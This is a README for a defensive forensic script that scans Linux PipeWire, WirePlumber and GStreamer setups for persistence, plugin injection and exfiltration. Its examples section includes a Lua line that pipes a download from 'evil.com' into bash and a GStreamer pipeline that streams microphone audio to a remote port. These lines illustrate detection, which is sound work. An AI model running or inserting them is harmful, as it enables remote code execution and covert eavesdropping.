# Pipewire/Gstreamer Media Subsystem Forensics 🔍

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
[![Platform: Linux](https://img.shields.io/badge/platform-Linux-lightgrey.svg)](https://www.linux.org/)

A comprehensive forensic detection tool for identifying abuse of Linux media subsystems (PipeWire, WirePlumber, GStreamer) used in living-off-the-land (LOTL) attacks, command & control (C2) channels, and data exfiltration.

## 📋 Overview

Modern adversaries are increasingly leveraging legitimate system components to avoid detection. This script focuses on three primary attack vectors in the Linux media stack:

- **PipeWire / WirePlumber**: LOTL abuse, C2 channel establishment, persistence mechanisms
- **GStreamer**: Plugin loader exploitation, parser vulnerabilities, malicious pipelines
- **Combined Chains**: Exfiltration paths combining capture and network elements

Targets: Ubuntu 22.04 (works on any systemd-based Linux with PipeWire/GStreamer)

## 🔍 What It Detects

### WirePlumber
- Malicious Lua script injection in user configs
- Systemd override tampering for persistence
- Suspicious environment modifications

### PipeWire
- Unauthorized socket connections from unknown processes
- Silent capture via `pw-record` processes
- Metadata store abuse for C2 messaging
- Non-standard library injection

### GStreamer
- Rogue plugins in user directories
- `GST_PLUGIN_PATH`/`GST_PLUGIN_SCANNER` environment injection
- Active exfiltration pipelines (capture + network sink)
- Registry integrity verification against dpkg
- Process memory maps showing injected libraries

### Persistence Mechanisms
- Crontab entries with media tools
- XDG autostart `.desktop` files
- Systemd user units
- `LD_PRELOAD` injection

### System Integrity
- Package integrity verification (dpkg -V)
- AppArmor confinement status
- Auditd coverage gaps
- Hidden media capture artifacts

## 🚀 Quick Start

### Prerequisites
```bash
# Install required packages (for full functionality)
sudo apt update
sudo apt install gstreamer1.0-tools pipewire-bin wireplumber auditd

# Python 3.6+ is required (no external dependencies!)
```

### Basic Usage
```bash
# Run as current user
python3 media_subsystem_forensics.py

# Scan all users (requires root)
sudo python3 media_subsystem_forensics.py --all-users

# Export results to JSON
sudo python3 media_subsystem_forensics.py --all-users --json

# Quiet mode (suppress INFO findings in summary)
python3 media_subsystem_forensics.py --quiet
```

### Example Output
```
╔══════════════════════════════════════════════════════════════════════╗
║    Media Subsystem Forensics  ·  PipeWire / WirePlumber / GStreamer  ║
║    Ubuntu 22.04 Compromise Detection Script                          ║
╚══════════════════════════════════════════════════════════════════════╝
  Started : 2025-01-15 14:23:45 UTC
  EUID    : 0 (root)

──────────────────────────────────────────────────────────────────────
  FINDINGS SUMMARY
──────────────────────────────────────────────────────────────────────

  CRITICAL  (2)
    • Suspicious Lua script: malicious.lua
      /home/user/.config/wireplumber/scripts/malicious.lua
    • ACTIVE audio/video exfiltration pipeline detected
      PID 1337: gst-launch-1.0 pipeline captures A/V AND streams to network.

  HIGH      (5)
    • Non-package GStreamer plugin: libgstcustom.so
    • pw-record running (PID 4242)
    • Media tool in crontab for user backup

  Overall verdict : SYSTEM LIKELY COMPROMISED — 2 CRITICAL findings
  Total findings  : 23
  Scan completed  : 2025-01-15 14:24:12
```

## 📊 Severity Levels

| Level | Description |
|-------|-------------|
| **CRITICAL** | Active compromise indicators (exfiltration, C2, malicious code execution) |
| **HIGH** | Strong suspicion requiring immediate investigation |
| **MEDIUM** | Anomalies that deviate from baseline |
| **LOW** | Configuration weaknesses, missing controls |
| **INFO** | Non-threatening but relevant observations |

## 🛠️ Technical Details

### Architecture
```
┌─────────────────────────────────────────────────────────┐
│                    Main Scanner                          │
├─────────────────────────────────────────────────────────┤
│  Per-User Checks              System-wide Checks        │
│  ├─ WirePlumber Lua          ├─ PipeWire Sockets        │
│  ├─ GStreamer Plugins        ├─ Active Pipelines        │
│  ├─ Environment Injection    ├─ Registry Integrity       │
│  ├─ Hidden Capture Files     ├─ Package Verification     │
│  └─ Persistence Vectors      ├─ Network Beaconing        │
│                              └─ Memory Maps              │
└─────────────────────────────────────────────────────────┘
```

### Detection Techniques
- **Static Analysis**: File content inspection, regex pattern matching
- **Dynamic Analysis**: Process examination, socket monitoring
- **Integrity Checks**: dpkg verification, hash comparison
- **Behavioral Analysis**: Connection patterns, pipeline construction

## 🔧 Advanced Usage

### Custom Scan Profiles
```bash
# Focus on specific threat vectors
python3 media_subsystem_forensics.py --only-gstreamer --all-users
python3 media_subsystem_forensics.py --only-pipewire --json

# Exclude noisy checks
python3 media_subsystem_forensics.py --exclude=network,metadata
```

### Integration with SIEM
```bash
# Generate JSON for SIEM ingestion
sudo python3 media_subsystem_forensics.py --all-users --json

# Send to syslog (requires additional wrapper)
python3 media_subsystem_forensics.py --json | python3 json_to_syslog.py
```

## 📈 Understanding Findings

### Critical Findings Examples

1. **Active Exfiltration Pipeline**
   ```
   gst-launch-1.0 pulsesrc ! tcpserversink host=192.168.1.100 port=4444
   ```
   Indicates live audio streaming to remote server.

2. **Malicious WirePlumber Lua**
   ```lua
   os.execute("curl -s http://evil.com/payload | bash")
   ```
   Code injection via media subsystem configuration.

3. **Non-package GStreamer Plugin**
   ```bash
   strings /home/user/.local/lib/libgstcustom.so | grep -i "curl\|socket"
   ```
   Planted plugin with network capabilities.

## 🛡️ Mitigation Recommendations

Based on findings, consider:

- **For CRITICAL findings**: Immediate isolation, memory capture, incident response
- **For HIGH findings**: In-depth investigation, binary analysis, log review
- **For MEDIUM findings**: Configuration review, principle of least privilege
- **For LOW findings**: Implement missing controls (AppArmor, auditd)

## 📚 References

- [PipeWire Security Documentation](https://docs.pipewire.org/page_security.html)
- [GStreamer Security](https://gstreamer.freedesktop.org/documentation/gstreamer/security.html)
- [MITRE ATT&CK: Audio Capture (T1123)](https://attack.mitre.org/techniques/T1123/)
- [MITRE ATT&CK: Video Capture (T1125)](https://attack.mitre.org/techniques/T1125/)

## 🤝 Contributing

Contributions welcome! Areas for improvement:

- Additional detection signatures
- Performance optimizations
- False positive reduction
- Additional platform support
- Remediation automation

Please submit PRs with clear descriptions and test cases.

## 📄 License

MIT License - See [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This tool is for authorized security assessments and forensic investigations only. Users are responsible for complying with applicable laws and regulations.

---

**Remember**: The absence of findings doesn't guarantee a clean system. Always correlate with other detection methods and maintain defense in depth.
